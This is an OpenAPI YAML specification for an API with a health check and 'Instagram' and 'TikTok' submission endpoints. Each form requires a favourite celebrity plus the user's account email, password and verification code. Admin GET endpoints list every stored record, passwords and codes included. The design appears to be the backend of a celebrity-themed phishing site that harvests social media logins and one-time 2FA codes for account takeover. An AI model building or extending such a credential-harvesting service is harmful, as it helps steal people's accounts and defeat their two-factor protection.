# lib/api-spec/openapi.yaml
openapi: 3.1.0
info:
  # Do not change the title, if the title changes, the import paths will be broken
  title: Api
  version: 0.1.0
  description: API specification
servers:
  - url: /api
    description: Base API path
tags:
  - name: health
    description: Health operations
  - name: submissions
    description: Form submission operations
paths:
  /healthz:
    get:
      operationId: healthCheck
      tags: [health]
      summary: Health check
      description: Returns server health status
      responses:
        "200":
          description: Healthy
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/HealthStatus"

  /submissions/instagram:
    post:
      operationId: submitInstagram
      tags: [submissions]
      summary: Submit Instagram form
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/InstagramSubmission"
      responses:
        "201":
          description: Submitted successfully
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/SubmissionResponse"
    get:
      operationId: listInstagramSubmissions
      tags: [submissions]
      summary: List all Instagram submissions (admin)
      responses:
        "200":
          description: List of submissions
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/InstagramSubmissionRecord"

  /submissions/tiktok:
    post:
      operationId: submitTiktok
      tags: [submissions]
      summary: Submit TikTok form
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/TiktokSubmission"
      responses:
        "201":
          description: Submitted successfully
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/SubmissionResponse"
    get:
      operationId: listTiktokSubmissions
      tags: [submissions]
      summary: List all TikTok submissions (admin)
      responses:
        "200":
          description: List of submissions
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/TiktokSubmissionRecord"

components:
  schemas:
    HealthStatus:
      type: object
      properties:
        status:
          type: string
      required:
        - status

    InstagramSubmission:
      type: object
      properties:
        favoriteCelebrity:
          type: string
        email:
          type: string
        password:
          type: string
        verificationCode:
          type: string
      required:
        - favoriteCelebrity
        - email
        - password
        - verificationCode

    TiktokSubmission:
      type: object
      properties:
        favoriteCelebrity:
          type: string
        email:
          type: string
        password:
          type: string
        verificationCode:
          type: string
      required:
        - favoriteCelebrity
        - email
        - password
        - verificationCode

    SubmissionResponse:
      type: object
      properties:
        success:
          type: boolean
        message:
          type: string
      required:
        - success
        - message

    InstagramSubmissionRecord:
      type: object
      properties:
        id:
          type: integer
        favoriteCelebrity:
          type: string
        email:
          type: string
        password:
          type: string
        verificationCode:
          type: string
        submittedAt:
          type: string
          format: date-time
      required:
        - id
        - favoriteCelebrity
        - email
        - password
        - verificationCode
        - submittedAt

    TiktokSubmissionRecord:
      type: object
      properties:
        id:
          type: integer
        favoriteCelebrity:
          type: string
        email:
          type: string
        password:
          type: string
        verificationCode:
          type: string
        submittedAt:
          type: string
          format: date-time
      required:
        - id
        - favoriteCelebrity
        - email
        - password
        - verificationCode
        - submittedAt